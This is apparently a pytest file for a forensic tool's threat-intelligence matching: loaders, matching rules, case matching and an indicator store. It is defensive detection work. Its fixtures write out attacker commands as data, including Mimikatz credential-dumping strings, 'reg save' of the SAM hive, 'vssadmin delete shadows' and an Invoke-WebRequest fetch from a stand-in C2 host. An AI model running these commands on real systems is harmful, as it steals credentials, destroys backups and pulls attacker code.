"""Threat intelligence: the fixed schema, every loader, matching rules, a case match, and the
backend's store (rowanholt/threat_intel/, src/web/backend/threat_intel_store.py)."""
import csv
import dataclasses
import json
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[2]
# Appended, not prepended: src/analysis/platform would shadow the stdlib module.
sys.path.append(str(REPO / "src" / "analysis"))

from rowanholt.core.records import read_records, write_records  # noqa: E402
from rowanholt.threat_intel import COLUMNS, Indicator, ThreatIntelIndex, enrich_artefact, load, load_all  # noqa: E402
from rowanholt.threat_intel.index import classify  # noqa: E402
from rowanholt.threat_intel.match import match_case  # noqa: E402
from rowanholt.threat_intel.schema import read_csv, write_csv  # noqa: E402
from rowanholt.threat_intel.stix import parse_stix_bundle, parse_stix_bundle_with_validity  # noqa: E402
from rowanholt.threat_intel.validity import Validity, default_validity  # noqa: E402

TEN = ["Evidential Element", "Threat Group", "Procedure Example", "Technique ID", "Technique Name", "Tactic",
       "Contextual Evidence", "Reference URL", "Navigation Layer URL", "Source Type"]


def test_the_schema_is_fixed():
    """Ten columns, in this order: the workbook, the table (alembic 7c41d2e9a0b3) and the CSV agree."""
    assert list(COLUMNS) == TEN
    assert [f.name for f in dataclasses.fields(Indicator)] == list(COLUMNS.values())
    migration = (REPO / "src" / "web" / "backend" / "alembic" / "versions" /
                 "7c41d2e9a0b3_add_threat_intel_indicators.py").read_text()
    for name in COLUMNS.values():
        assert f"sa.Column('{name}'" in migration


def test_iran_apt_workbook(tmp_path):
    openpyxl = pytest.importorskip("openpyxl")
    book = openpyxl.Workbook()
    sheet = book.active
    sheet.append(["Iran APT threat intelligence: lab sample"])  # a title above the header is fine
    sheet.append(list(reversed(TEN)) + ["Analyst notes"])  # any order, extra columns ignored
    row = {"Evidential Element": "c2.rivendell-lab.test", "Threat Group": "APT34", "Technique ID": "T1071.001",
           "Technique Name": "Web Protocols", "Tactic": "Command and Control", "Source Type": ""}
    sheet.append([row.get(c, "") for c in reversed(TEN)] + ["ignored"])
    sheet.append([row.get(c, "") for c in reversed(TEN)] + ["a duplicate"])
    book.create_sheet("Notes").append(["no indicators here"])
    path = tmp_path / "iran_apt.xlsx"
    book.save(path)
    (indicator,) = load(str(path))
    assert (indicator.evidential_element, indicator.threat_group, indicator.technique_id) == \
        ("c2.rivendell-lab.test", "APT34", "T1071.001")
    assert indicator.source_type == "Iran APT workbook"


def test_stix_bundle_links_each_indicator_to_its_own_group_and_technique():
    bundle = {"type": "bundle", "id": "bundle--1", "objects": [
        {"type": "intrusion-set", "id": "intrusion-set--1", "name": "APT34"},
        {"type": "intrusion-set", "id": "intrusion-set--2", "name": "APT35"},
        {"type": "attack-pattern", "id": "attack-pattern--1", "name": "Web Protocols",
         "external_references": [{"source_name": "mitre-attack", "external_id": "T1071.001"}],
         "kill_chain_phases": [{"phase_name": "command-and-control"}]},
        {"type": "indicator", "id": "indicator--1", "name": "C2", "pattern": "[domain-name:value = 'c2.example.test']",
         "external_references": [{"url": "https://intel.example/report"}]},
        {"type": "indicator", "id": "indicator--2", "pattern": "[file:hashes.'SHA-256' = '" + "a" * 64 + "'] OR "
                                                               "[process:command_line = 'powershell -enc AAA']"},
        {"type": "relationship", "id": "r1", "relationship_type": "indicates", "source_ref": "indicator--1",
         "target_ref": "intrusion-set--1"},
        {"type": "relationship", "id": "r2", "relationship_type": "indicates", "source_ref": "indicator--1",
         "target_ref": "attack-pattern--1"},
    ]}
    found = {i.evidential_element: i for i in parse_stix_bundle(bundle)}
    c2 = found["c2.example.test"]
    assert (c2.threat_group, c2.technique_id, c2.technique_name, c2.tactic) == \
        ("APT34", "T1071.001", "Web Protocols", "Command And Control")
    assert c2.reference_url == "https://intel.example/report"
    # Two groups in the bundle and no relationship: no group is guessed
    assert found["a" * 64].threat_group == "" and "powershell -enc AAA" in found


def mitresaw_csv(path, rows):
    with open(path, "w", newline="") as out:
        writer = csv.writer(out)
        writer.writerow(["group_sw_id", "group_sw_name", "technique_id", "technique_name", "tactic", "platforms",
                         "framework", "procedure_example", "evidence", "detectable_via"])
        for group, technique, evidence in rows:
            writer.writerow([f"G{abs(hash(group)) % 9999:04}", group, technique, "", "", "Windows", "Enterprise",
                             f"{group} did this", json.dumps(evidence), "Sysmon: 1"])


def test_sources_by_content(tmp_path):
    mitresaw_csv(tmp_path / "mitre_procedures.csv", [("APT29", "T1003.001", {"software": ["Mimikatz"]})])
    (tmp_path / "watch.txt").write_text("# lab\n198.51.100.23\n\nc2.rivendell-lab.test\n")
    (tmp_path / "bundle.json").write_text(json.dumps({"type": "bundle", "objects": [
        {"type": "ipv4-addr", "id": "ipv4-addr--1", "value": "203.0.113.5"}]}))
    loaded = load_all([str(tmp_path / n) for n in ("mitre_procedures.csv", "watch.txt", "bundle.json")])
    assert {i.evidential_element for i in loaded} == {"Mimikatz", "198.51.100.23", "c2.rivendell-lab.test", "203.0.113.5"}
    write_csv(str(tmp_path / "export.csv"), loaded)
    assert read_csv(str(tmp_path / "export.csv")) == loaded  # what the worker hands Elrond reads back the same
    (tmp_path / "notes.csv").write_text("a,b\n1,2\n")
    with pytest.raises(ValueError):
        load(str(tmp_path / "notes.csv"))


@pytest.mark.parametrize("value, kind", [
    ("198.51.100.23", "ip"), ("a" * 64, "hash"), ("https://x.test/a", "url"), ("c2.rivendell-lab.test", "domain"),
    ("HKEY_CURRENT_USER\\Software\\Run", "reg"), ("C:\\Program Files\\x\\y.exe", "path"), ("mimikatz.exe", "file"),
    ("vssadmin delete shadows /all", "cmd"), ("Mimikatz", "software"),
])
def test_classify(value, kind):
    assert classify(value) == kind


def procedures(*rows):
    return [Indicator(evidential_element=e, threat_group=g, technique_id=t, source_type="MITRESaw",
                      contextual_evidence=k) for e, g, t, k in rows]


def test_matching_rules():
    index = ThreatIntelIndex(procedures(
        ("Mimikatz", "APT29", "T1003.001", "software"),
        ("sekurlsa::logonpasswords", "APT29", "T1003.001", "cmd"),
        ("net", "APT29", "T1087", "cmd"),                  # a built-in: never a match
        ("hidden", "APT19", "T1564.003", "cmd"),           # a word from a command line
        (".jpg", "Lazarus Group", "T1027", "file"),        # an extension
        ("WinMM", "Naikon", "T1105", "software"),          # malware named like a Windows library
        ("vssadmin delete shadows /all /quiet", "Conti", "T1490", "cmd"),
        ("vssadmin delete shad", "Wizard Spider", "T1490", "cmd"),  # a truncated copy
        ("C:\\ProgramData\\Microsoft", "APT1", "T1074", "file"),     # a directory near the root
        ("HKEY_LOCAL_MACHINE", "Threat Group-3390", "T1027.011", "software"),  # a hive: in every registry path
        ("HKLM\\SOFTWARE", "APT1", "T1012", "reg"),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "APT29", "T1547.001", "reg"),
    ))
    def elements(text):
        return [e["element"] for e in enrich_artefact(text, index)]
    assert elements("C:\\Users\\bob\\AppData\\Local\\Temp\\mimikatz.exe sekurlsa::logonpasswords exit") == \
        ["Mimikatz", "sekurlsa::logonpasswords"]
    assert elements("net user /domain && powershell -w hidden") == []
    assert elements("C:\\Windows\\System32\\winmm.dll photo.jpg C:\\ProgramData\\Microsoft\\x.dat") == []
    assert elements("vssadmin delete shadows /all /quiet") == ["vssadmin delete shadows /all /quiet"]
    assert elements("reg save HKLM\\SAM C:\\Users\\Public\\s.hiv") == []
    assert elements("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x") == \
        ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"]


def test_case_scope_keeps_only_tools_and_commands_from_procedures():
    rows = procedures(("kernel32.dll", "APT29", "T1106", "file"), ("Mimikatz", "APT29", "T1003.001", "software"),
                      ("hklm\\software\\microsoft\\windows\\currentversion\\run", "APT29", "T1547.001", "reg"))
    rows.append(Indicator(evidential_element="kernel32.dll", source_type="Watchlist: mine.txt"))
    case = ThreatIntelIndex(rows, scope="case")
    assert sorted(i.evidential_element + "|" + i.source_type for i in case.indicators) == \
        ["Mimikatz|MITRESaw", "kernel32.dll|Watchlist: mine.txt"]  # curated sources match in full
    assert len(ThreatIntelIndex(rows, scope="value")) == 4


def test_case_match(tmp_path):
    case = tmp_path / "case"
    cooked = case / "HOST" / "artefacts" / "cooked"
    cooked.mkdir(parents=True)
    (case / "HOST" / "analysis").mkdir()
    (case / "mitre_techniques.txt").write_text("T1003.001\nT1059.001\nT1071\n")
    # As Elrond writes them: JSON Lines with the envelope (whose host name must not match anything)
    write_records(cooked / "powershell_history.jsonl", [
        {"User": "bob", "Command": "Invoke-WebRequest http://c2.rivendell-lab.test/a"},
        {"User": "bob", "Command": ".\\mimikatz.exe privilege::debug"}], host="Mimikatz", artefact="powershell_history")
    write_records(cooked / "events.jsonl", [{"EventData": {"CommandLine": "ping 198.51.100.23"}}],
                  host="HOST", artefact="events")
    write_records(case / "HOST" / "analysis" / "iocs.jsonl", [
        {"Filename": "x", "ioc": "c2.rivendell-lab.test", "indicator_type": "domain", "watchlist_match": ""},
        {"Filename": "x", "ioc": "example.org", "indicator_type": "domain", "watchlist_match": ""}],
        host="HOST", artefact="iocs")
    indicators = procedures(("Mimikatz", "APT29", "T1003.001", "software"),
                            ("Invoke-WebRequest", "APT29", "T1059.001", "software"))
    indicators += [Indicator(evidential_element="c2.rivendell-lab.test", threat_group="APT34", technique_id="T1071.001",
                             source_type="Iran APT workbook"),
                   Indicator(evidential_element="198.51.100.23", threat_group="APT34", source_type="Iran APT workbook")]
    totals = match_case(str(case), indicators)
    assert totals["hosts"] == 1 and totals["elements"] == 4 and totals["iocs"] == 1
    found = [r for _, r in read_records(case / "HOST" / "analysis" / "threat_intel_matches.jsonl")]
    matches = {(r["Element"], r["Artefact"].split("/")[-1], r["Field"]) for r in found}
    assert ("198.51.100.23", "events.jsonl", "EventData.CommandLine") in matches
    assert ("Mimikatz", "powershell_history.jsonl", "Command") in matches
    assert all(r["Field"] not in ("host", "artefact", "source_path") for r in found)
    assert ["T1003.001"] in [r["techniques"] for r in found]
    iocs = {r["ioc"]: r["watchlist_match"] for _, r in read_records(case / "HOST" / "analysis" / "iocs.jsonl")}
    assert iocs == {"c2.rivendell-lab.test": "threat intel: APT34", "example.org": ""}
    groups = [r for _, r in read_records(case / "threat_groups.jsonl")]
    assert [(g["Group"], g["Basis"]) for g in groups] == [("APT34", "atomic indicators"),
                                                           ("APT29", "several specific procedures")]
    assert groups[1]["Techniques In Case"] == "T1003.001, T1059.001"


def test_gandalf_script_blocks_left_out(tmp_path):
    case = tmp_path / "case"
    evt = case / "HOST" / "artefacts" / "cooked" / "evt"
    evt.mkdir(parents=True)

    def block(number, text, block_id, path=""):
        return {"data": {"Event": {"EventData": {"MessageNumber": number, "ScriptBlockText": text,
                                                 "ScriptBlockId": block_id, "Path": path}}}}
    # Part 2 of Gandalf's block has no Path, but shares its id; the attacker's block mentions the
    # same command, after more than a snippet's worth of other script
    (evt / "Microsoft-Windows-PowerShell%4Operational.json").write_text(json.dumps([
        block(1, "function Get-Mft {}", "g1", "C:\\TEMP\\gandalf\\gandalf\\tools\\Invoke-ArtefactAcquisition.ps1"),
        block(2, "reg save HKLM\\SAM C:\\TEMP\\gandalf\\sam", "g1"),
        block(1, "# padding\n" * 60 + "reg save HKLM\\SAM C:\\Users\\Public\\s.hiv", "a1"),
    ]))
    totals = match_case(str(case), procedures(("reg save", "APT29", "T1003.002", "cmd")))
    assert totals["collector"] == 2 and totals["elements"] == 1
    # An old case's JSON array: records are still #index
    rows = [r for _, r in read_records(case / "HOST" / "analysis" / "threat_intel_matches.jsonl")]
    assert [r["Record"] for r in rows] == ["#2"] and "reg save HKLM\\SAM C:\\Users\\Public" in rows[0]["Value"]


def test_backend_store(tmp_path):
    sqlalchemy = pytest.importorskip("sqlalchemy")
    # First on the path: src/analysis has its own config module, which would win
    sys.path.insert(0, str(REPO / "src" / "web" / "backend"))
    import storage
    from threat_intel_store import ThreatIntelStore
    engine = sqlalchemy.create_engine(f"sqlite:///{tmp_path / 'db.sqlite'}")
    storage.Base.metadata.create_all(engine)
    store = ThreatIntelStore(sqlalchemy.orm.sessionmaker(bind=engine))
    first = [Indicator(evidential_element="c2.rivendell-lab.test", threat_group="APT34", source_type="Iran APT workbook"),
             Indicator(evidential_element="198.51.100.23", threat_group="APT34", source_type="Iran APT workbook")]
    assert store.add(first) == (2, 0)
    again = [Indicator(evidential_element="C2.RIVENDELL-LAB.TEST", threat_group="apt34", source_type="Iran APT workbook"),
             Indicator(evidential_element="Mimikatz", threat_group="APT29", source_type="MITRESaw")]
    assert store.add(again) == (1, 1)  # the same key whatever its case
    assert store.counts() == {"total": 3, "groups": 2, "expired": 0, "sources": [{"source": "Iran APT workbook", "count": 2},
                                                                   {"source": "MITRESaw", "count": 1}]}
    assert store.search("rivendell")["total"] == 1
    assert sorted(i.evidential_element for i in store.indicators()) == ["198.51.100.23", "Mimikatz",
                                                                        "c2.rivendell-lab.test"]
    assert store.export_csv(str(tmp_path / "export.csv")) == 3
    assert store.delete_source("MITRESaw") == 1 and store.version()[0] == 2


def test_stix_validity_beside_the_rows():
    """valid_until and confidence come back beside the ten columns, never in them."""
    bundle = {"type": "bundle", "objects": [
        {"type": "indicator", "id": "indicator--1", "pattern": "[ipv4-addr:value = '198.51.100.23']",
         "valid_from": "2026-01-01T00:00:00Z", "valid_until": "2026-04-01T00:00:00.000Z", "confidence": 80},
        {"type": "indicator", "id": "indicator--2", "pattern": "[ipv4-addr:value = '198.51.100.23']",
         "valid_until": "2026-06-01T00:00:00Z", "confidence": 40},
        {"type": "indicator", "id": "indicator--3", "pattern": "[domain-name:value = 'c2.example.test']"},
    ]}
    indicators, validity = parse_stix_bundle_with_validity(bundle)
    assert sorted(i.evidential_element for i in indicators) == ["198.51.100.23", "c2.example.test"]
    [(key, held)] = validity.items()  # the domain's object gives none: it gets the default lifetime on import
    assert key[0] == "198.51.100.23"
    # The same indicator twice: the later expiry, the higher confidence, the earlier first sighting
    assert (held.valid_until.isoformat(), held.confidence, held.first_seen.isoformat()) == \
        ("2026-06-01T00:00:00", 80, "2026-01-01T00:00:00")


def test_default_lifetimes():
    from datetime import datetime, timedelta
    now = datetime(2026, 11, 2)
    assert default_validity(Indicator("198.51.100.23"), now).valid_until == now + timedelta(days=90)
    assert default_validity(Indicator("c2.example.test"), now).valid_until == now + timedelta(days=90)
    for value in ("a" * 64, "Mimikatz", "powershell -enc AAA", "C:\\Users\\Public\\x.exe"):
        assert default_validity(Indicator(value), now).valid_until is None, value


def test_expired_indicators_are_left_out_of_matching(tmp_path):
    from datetime import datetime, timedelta
    sqlalchemy = pytest.importorskip("sqlalchemy")
    sys.path.insert(0, str(REPO / "src" / "web" / "backend"))
    import storage
    from threat_intel_store import ThreatIntelStore
    engine = sqlalchemy.create_engine(f"sqlite:///{tmp_path / 'db.sqlite'}")
    storage.Base.metadata.create_all(engine)
    store = ThreatIntelStore(sqlalchemy.orm.sessionmaker(bind=engine))
    bundle = {"type": "bundle", "objects": [
        {"type": "indicator", "id": "indicator--1", "pattern": "[ipv4-addr:value = '198.51.100.23']",
         "valid_until": "2026-03-01T00:00:00Z", "confidence": 70},
        {"type": "indicator", "id": "indicator--2", "pattern": "[file:hashes.'SHA-256' = '" + "b" * 64 + "']"}]}
    indicators, validity = parse_stix_bundle_with_validity(bundle, source="STIX: test")
    watchlist = [Indicator("c2.example.test", source_type="Watchlist: x"), Indicator("Mimikatz", source_type="Watchlist: x")]
    january = datetime(2026, 1, 1)
    assert store.add(indicators, validity, now=january) == (2, 0)
    assert store.add(watchlist, now=january) == (2, 0)
    def elements(now):
        return sorted(i.evidential_element for i in store.indicators(now=now))
    assert elements(january) == ["198.51.100.23", "Mimikatz", "b" * 64, "c2.example.test"]
    # March: the STIX IP is past its valid_until; June: the watchlist domain is past its 90 days
    assert elements(datetime(2026, 3, 2)) == ["Mimikatz", "b" * 64, "c2.example.test"]
    assert elements(datetime(2026, 6, 1)) == ["Mimikatz", "b" * 64]
    assert store.expired_count(datetime(2026, 6, 1)) == 2
    assert store.counts()["expired"] == 2  # today's date is past both
    page = {i["evidential_element"]: i for i in store.search()["indicators"]}
    assert page["198.51.100.23"]["expired"] and page["198.51.100.23"]["confidence"] == 70
    assert page["b" * 64]["valid_until"] is None and not page["b" * 64]["expired"]
    assert store.export_csv(str(tmp_path / "export.csv")) == 2
    assert len(store.indicators(include_expired=True)) == 4

    # A refreshed import brings the domain back for another 90 days from then, and keeps when it was first seen
    later = datetime(2026, 11, 1)
    assert store.add(watchlist, now=later) == (0, 2)
    domain = store.search("c2.example")["indicators"][0]
    assert domain["valid_until"] == (later + timedelta(days=90)).isoformat() and domain["first_seen"] == january.isoformat()
    assert "c2.example.test" in elements(later)
    # An admin clears the IP's expiry, or extends it
    ip = page["198.51.100.23"]["id"]
    store.set_validity(ip, None)
    assert "198.51.100.23" in elements(later)
    store.set_validity(ip, datetime(2026, 12, 1))
    assert "198.51.100.23" not in elements(datetime(2026, 12, 2))
    with pytest.raises(KeyError):
        store.set_validity(999999, None)
    # Removing a source removes its validity rows too
    assert store.delete_source("STIX: test") == 2
    with store.Session() as session:
        assert session.query(storage.ThreatIntelValidityModel).count() == 1  # the watchlist domain's
